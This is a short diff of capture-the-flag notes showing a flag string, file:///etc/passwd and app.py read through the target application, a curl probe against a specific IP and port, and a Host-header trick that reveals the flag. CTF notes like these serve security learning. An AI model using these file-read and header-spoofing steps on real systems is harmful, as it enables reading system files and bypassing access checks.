@@ -22,6 +22,7 @@ guests (application data)
 ctf{57b23475b9b02093a9eb5d7df5f07957e2b2dc724443d6b08961fbe3387}
 
 Tried file:///etc/passwd → worked, found /home/ctf user
+curl -I http://34.89.248.39:30385 - to check if it's python
 Tried file:///home/ctf/app.py → got Python source code
 Code showed: If Host header = "company.tld" → flag reveals
 curl -H "Host: company.tld" http://34.89.248.39:30385/
